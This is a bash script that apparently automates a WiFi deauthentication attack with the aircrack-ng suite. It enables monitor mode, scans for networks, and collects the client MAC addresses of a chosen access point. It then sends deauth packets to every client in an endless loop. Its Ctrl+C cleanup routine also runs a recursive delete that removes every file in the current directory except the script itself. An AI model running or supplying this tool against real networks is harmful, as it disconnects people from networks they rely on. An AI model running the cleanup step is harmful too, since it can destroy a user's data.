#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root."
  exit
fi

ip a

echo "Enter your WiFi interface (e.g., wlan1):"
read interface

airmon-ng start $interface
mon_interface="${interface}mon"

echo "[*] Scanning for networks... Press Ctrl+C to stop"
airodump-ng $mon_interface

echo "Enter the target network's BSSID:"
read bssid

echo "Enter the target network's channel:"
read channel

echo "Enter deauth value (0 = unlimited, 10 = 10 packets):"
read deatth

echo "[*] Scanning devices on the target network... Press Ctrl+C to stop"
airodump-ng -c $channel --bssid $bssid -w targets $mon_interface

grep Station targets-01.csv -A 1000 | tail -n +2 | awk -F',' '{print $1}' | grep -v '^$' > macs.txt

echo "[*] MAC addresses saved to macs.txt:"
cat macs.txt

trap cleanup SIGINT

cleanup() {
  echo ""
  echo "[*] Ctrl+C received. Starting cleanup..."

  airmon-ng stop "$mon_interface"

  echo "[*] Deleting all files except airkechi.sh..."
  find . -maxdepth 1 ! -name 'airkechi.sh' ! -name '.' -exec rm -rf {} +

  echo "[✓] Cleanup complete!"
  echo "[✓] Process finished!"
  exit
}

echo "[*] Starting deauth attacks... Press Ctrl+C to stop"
while true; do
  while read mac; do
    echo ">>> Targeting $mac... (infinite loop)"
    aireplay-ng --deauth $deatth -a $bssid -c $mac $mon_interface
  done < macs.txt
done
